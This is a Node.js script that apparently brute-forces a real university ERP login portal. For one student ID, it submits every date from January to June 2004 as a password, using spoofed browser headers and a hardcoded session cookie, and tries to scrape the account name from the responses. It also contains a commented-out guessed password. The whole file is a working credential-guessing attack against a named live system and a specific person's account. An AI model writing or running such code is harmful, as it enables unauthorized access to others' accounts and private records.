const axios = require('axios');
const FormData = require('form-data');


async function main() {
    let found = false; let name = "N/A";
    let yr = 2004;
    let month = 1;
    let date = 1;
    let pwd = "";
    for (yr = 2004; yr >= 2004; yr--) {
        for (month = 1; month <= 6; month++) {
            for (date = 1; date <= 31; date++) {
                let ystr = yr.toString();
                let mstr = month.toString();
                let dstr = date.toString();
                if (mstr.length == 1) mstr = "0" + mstr;
                if (dstr.length == 1) dstr = "0" + dstr;
                pwd = ystr + "-" + mstr + "-" + dstr;
                // console.log(pwd)
                let outp = await execute(pwd)
                if (outp != "") name = outp;
            }
        }
    }

    // execute("Om@iiita1")
    let outp = await execute(pwd)
    if (outp != "") name = outp;
    console.log(name)
}
async function execute(pwd) {
    console.log(pwd)

    let data = new FormData();
    data.append('myBatch', 'Jan-2024');
    data.append('uid', 'IIT2022000');
    data.append('pwd', pwd);
    data.append('norobo', '1');
    // import { parse } from 'node-html-parser';s
    const { parse } = require("node-html-parser");

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'https://erp.iiita.ac.in/',
        headers: {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,hi;q=0.8',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Origin': 'https://erp.iiita.ac.in',
            'Referer': 'https://erp.iiita.ac.in/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Cookie': 'PHPSESSID=mhrk4j1ifatli91am06s9j4rg8',
            ...data.getHeaders()
        },
        data: data
    };
    let tr = "";
    try {
        const res = await axios.request(config);
        const root = parse(res.data);
        if(pwd=="Om@iiita1") console.log(root)
        // console.log(res.data)
    }
    catch(e){
        // console.log(e);
        console.log("Failed for "+pwd)
    }
    // axios.request(config)
    //     .then((response) => {
    //         //   console.log(response);
    //         const root = parse(response.data);
    //         console.log(root.getElementsByTagName("sup")[0].toString())
    //         found = 1;
    //         name = root.getElementsByTagName("sup")[0].toString()
    //         tr = name
    //         return tr;
    //     })
    //     .catch((error) => {
    //         console.log("Done with " + pwd);
    //         if (pwd == "Om@iiita1") console.log(error)
    //     });
    return tr;

}

main()